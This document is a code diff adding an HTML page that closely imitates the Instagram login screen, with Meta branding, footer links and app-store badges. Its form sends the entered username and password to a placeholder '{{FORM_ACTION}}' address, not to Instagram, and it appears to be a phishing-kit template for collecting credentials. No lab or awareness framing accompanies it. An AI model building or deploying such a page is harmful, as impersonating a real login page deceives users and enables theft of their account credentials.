@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Login • Instagram</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <style>
+        img { vertical-align: text-top; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+            background-color: #fafafa;
+            box-sizing: border-box;
+            margin: 0;
+        }
+        .loader-overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background-color: rgba(20, 20, 20, 0.926);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            opacity: 1;
+            visibility: visible;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+        }
+        .loaded .loader-overlay {
+            opacity: 0;
+            visibility: hidden;
+        }
+        .loader {
+            width: 40px;
+            aspect-ratio: 1;
+            border-radius: 50%;
+            border: 3px solid #575757;
+            border-right-color: #1474cd;
+            animation: l2 1s infinite linear;
+        }
+        @keyframes l2 { to { transform: rotate(1turn); } }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: center;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 3rem;
+            font-size: 14px;
+        }
+        .box {
+            max-width: 350px;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            background-color: #ffff;
+            border: 1px solid #e6e6e6;
+            border-radius: 1px;
+            margin: 0 0 10px;
+            padding: 10px 0;
+            flex-grow: 1;
+        }
+        .heading {
+            margin: 22px auto 12px;
+            height: 51px;
+            width: 177px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .heading img {
+            height: 51px;
+            width: 177px;
+            object-fit: contain;
+        }
+        .field {
+            margin: 10px 0;
+            position: relative;
+            font-size: 14px;
+            width: 100%;
+            text-overflow: ellipsis;
+        }
+        .login-form input {
+            padding: 9px 0px 7px 9px;
+            font-size: 12px;
+            width: 16rem;
+            height: 1.2rem;
+            outline: none;
+            background: #fafafa;
+            border-radius: 3px;
+            border: 1px solid #efefef;
+        }
+        .login-form input::placeholder { visibility: hidden; }
+        .login-form ::-moz-placeholder { color: transparent; }
+        .login-form label {
+            position: absolute;
+            pointer-events: none;
+            left: 10px;
+            padding-bottom: 15px;
+            transform: translateY(10px);
+            line-height: 6px;
+            transition: all ease-out 0.1s;
+            font-size: 14px;
+            color: #999;
+            padding-top: 6px;
+        }
+        .login-form input:not(:placeholder-shown) + label {
+            transform: translateY(0);
+            font-size: 11px;
+        }
+        .login-form input:not(:placeholder-shown) {
+            padding-top: 14px;
+            padding-bottom: 2px;
+        }
+        .field {
+            position: relative;
+        }
+        #show-password-btn {
+            position: absolute;
+            right: 10px;
+            top: 10px;
+            background-color: transparent;
+            border: none;
+            cursor: pointer;
+            font-weight: 550;
+            color: rgb(48, 48, 48);
+            font-size: 12px;
+            display: none;
+        }
+        .login-button {
+            text-align: center;
+            width: 100%;
+            padding: 0.5rem;
+            border: 1px solid transparent;
+            background-color: #3897f0;
+            color: #fff;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        .separator {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: #999;
+            margin-top: 6px;
+        }
+        .separator .line {
+            height: 1px;
+            width: 40%;
+            background-color: #dbdbdb;
+        }
+        .other {
+            display: flex;
+            justify-content: center;
+            flex-direction: column;
+            align-items: center;
+        }
+        .fb-login-btn {
+            margin: 1rem;
+            border: 0;
+            cursor: pointer;
+            font-size: 14px;
+            color: #385185;
+            font-weight: 600;
+            background: transparent;
+        }
+        .fb-login-btn a {
+            text-decoration: none;
+            color: #385185;
+        }
+        .fb-icon { color: #385185; font-size: 1rem; padding-right: 1px; }
+        .forgot-password {
+            font-size: 12.5px;
+            color: #003569;
+            font-weight: 400;
+            text-decoration: none;
+        }
+        .signup { color: #3897f0; font-weight: 600; text-decoration: none; }
+        p { text-align: center; }
+        .footer {
+            text-align: center;
+            font-size: 13px;
+        }
+        .footer a {
+            padding: 8px 10px;
+            color: #6c6c6c;
+            text-decoration: none;
+        }
+        .footer a:hover { text-decoration: underline; }
+        .Language {
+            background-color: transparent;
+            border-color: #ccc;
+            width: 80px;
+            color: #6c6c6c;
+        }
+        .copyright { text-align: center; font-size: 14px; color: #6c6c6c; }
+        .get { text-align: center; font-size: 15px; }
+        .apps { align-items: center; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="loader-overlay">
+        <div class="loader"></div>
+    </div>
+    <div class="container">
+        <div class="box">
+            <div class="heading">
+                <img src="https://raw.githubusercontent.com/tejasmmali/instagram-login-clone/main/img/Instagram_logo_2016.svg.webp" alt="Instagram">
+            </div>
+            <form class="login-form" method="POST" action="{{FORM_ACTION}}">
+                <div class="field">
+                    <input id="username" type="text" name="login" placeholder="Phone number, username, or email" required>
+                    <label for="username">Phone number, username, or email</label>
+                </div>
+                <div class="field">
+                    <input id="message" type="password" name="password" placeholder="Password" required>
+                    <label for="password">Password</label>
+                    <button type="button" id="show-password-btn">Show</button>
+                </div>
+                <button class="login-button" type="submit" title="Login">Log In</button>
+                <div class="separator">
+                    <div class="line"></div>
+                    <p>OR</p>
+                    <div class="line"></div>
+                </div>
+                <div class="other">
+                    <button class="fb-login-btn" type="button">
+                        <i class="fa fa-facebook-official fb-icon"></i>
+                        <span>
+                            <img src="https://t3.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://www.facebook.com/&size=256" height="15" width="15" alt="">
+                            &nbsp;<a href="#">Log in with Facebook</a>
+                        </span>
+                    </button>
+                    <a class="forgot-password" href="#">Forgot password?</a>
+                </div>
+            </form>
+        </div>
+        <div class="box">
+            <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
+        </div>
+    </div>
+    <br>
+    <div class="get">Get the app.</div>
+    <br>
+    <div class="apps">
+        <a href="#">
+            <img src="https://raw.githubusercontent.com/tejasmmali/instagram-login-clone/main/img/google-playstore.png" height="40" width="134" alt="Get it on Google Play">
+        </a>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+        <a href="#">
+            <img src="https://raw.githubusercontent.com/tejasmmali/instagram-login-clone/main/img/microsoft-store.png" height="40" width="auto" alt="Get it from Microsoft">
+        </a>
+    </div>
+    <br>
+    <div class="footer">
+        <footer>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Contact Uploading & Non-Users</a>
+            <a href="#">Meta-verified</a>
+        </footer>
+    </div>
+    <div class="copyright">
+        <br>
+        <select aria-label="Switch Display Language" class="Language">
+            <option value="en">English</option>
+            <option value="fr">Français</option>
+            <option value="de">Deutsch</option>
+            <option value="es">Español</option>
+            <option value="it">Italiano</option>
+            <option value="pt">Português</option>
+        </select>
+        © 2024 Instagram from Meta
+    </div>
+    <script>
+        var showPasswordBtn = document.getElementById('show-password-btn');
+        var passwordField = document.getElementById('message');
+        if (showPasswordBtn && passwordField) {
+            passwordField.addEventListener('input', function() {
+                showPasswordBtn.style.display = passwordField.value.length > 0 ? 'block' : 'none';
+            });
+            showPasswordBtn.addEventListener('click', function() {
+                if (passwordField.type === 'password') {
+                    passwordField.type = 'text';
+                    showPasswordBtn.textContent = 'Hide';
+                } else {
+                    passwordField.type = 'password';
+                    showPasswordBtn.textContent = 'Show';
+                }
+            });
+        }
+        window.addEventListener('load', function() {
+            document.body.classList.add('loaded');
+        });
+    </script>
+</body>
+</html>
